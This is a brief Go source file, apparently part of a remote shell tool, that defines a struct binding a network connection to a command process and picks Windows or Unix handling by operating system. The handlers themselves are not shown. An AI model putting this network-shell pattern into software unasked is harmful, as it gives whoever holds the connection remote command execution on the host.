package core

import (
    "net"
    "os/exec"
    "runtime"
)

type Shell struct {
    conn net.Conn
    cmd  *exec.Cmd
}

func NewShell(conn net.Conn) *Shell {
    return &Shell{conn: conn}
}

func (s *Shell) Run() {
    if runtime.GOOS == "windows" {
        s.runWindows()
    } else {
        s.runUnix()
    }
}
